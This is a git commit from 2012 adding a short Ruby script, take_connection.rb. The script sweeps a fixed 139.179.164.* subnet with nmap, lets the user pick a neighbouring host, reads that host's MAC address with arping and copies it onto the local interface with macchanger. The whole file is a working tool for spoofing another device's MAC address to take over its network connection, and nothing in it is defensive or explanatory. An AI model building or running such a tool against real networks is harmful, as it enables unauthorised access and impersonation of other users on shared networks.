c8e14baa640bd61edaec30a14031e44cd941c21a
root <root@erogol-G50V.(none)>
2012-10-22 04:37:23 +0300

    First commit with take_action script

---
+++ take_connection.rb
@@ -0,0 +1,27 @@
+# Choose the interface
+puts "\nChoose interface you wanna work on\n";
+interface = STDIN.gets
+interface.chop!
+
+# Collect Possible IP addresses 
+value = %x(nmap -sP 139.179.164.* |grep -G -o 139.179.164.*)
+puts "Neighboor ip addresses:\n"
+value = value.split("\n")
+value.each_with_index.map do |k,i|
+	puts "#{i} #{k}"
+end
+puts "\nchoose the one typing line number \n"
+
+ip_no = STDIN.gets.to_i
+target = value[ip_no];
+puts "#{target}"
+
+# Get the mac address of the ip selected 
+mac = %x(arping #{target} -c 1 | grep -G -o '..:..:..:..:..:..')
+
+system("ifconfig #{interface} down")
+puts "\n"
+puts "macchanger #{interface} -m #{mac}"
+result  = system("macchanger #{interface} -m #{mac}")
+system("ifconfig #{interface} up")
+puts "Process has been finished with success : #{result}"
